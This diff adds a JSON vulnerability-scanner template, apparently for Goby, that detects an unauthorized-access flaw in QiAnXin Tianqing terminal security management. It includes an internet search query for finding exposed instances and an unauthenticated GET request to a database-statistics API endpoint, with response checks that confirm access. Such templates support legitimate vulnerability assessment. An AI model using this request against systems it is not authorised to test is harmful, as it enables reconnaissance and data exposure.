@@ -1,0 +1,74 @@
+{
+  "Name": "QiAnXin Tianqing terminal security management system unauthorized access",
+  "Description": "QiAnXin Terminal Security Management System is an integrated terminal security product solution for government and enterprise units. QiAnXin Tianqing terminal security management system has unauthorized access vulnerabilities.",
+  "Product": "360-TianQing",
+  "Homepage": "https://www.qianxin.com/product/detail/pid/49",
+  "DisclosureDate": "2021-03-16",
+  "Author": "1794790963@qq.com",
+  "FofaQuery": "app=\"360-TianQing\"",
+  "GobyQuery": "app=\"360-TianQing\"",
+  "Level": "2",
+  "Impact": "",
+  "Recommendation": "",
+  "References": null,
+  "RealReferences": [
+    "https://www.qianxin.com/product/detail/pid/49"
+  ],
+  "HasExp": false,
+  "ExpParams": null,
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "uri": "/api/dbstat/gettablessize"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "success",
+            "variable": "$body"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "data",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["unauthorized"],
+  "CVEIDs": null,
+  "CVSSScore": "N/A",
+  "AttackSurfaces": {
+    "Application": ["360-TianQing"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+  "Disable": true
+}
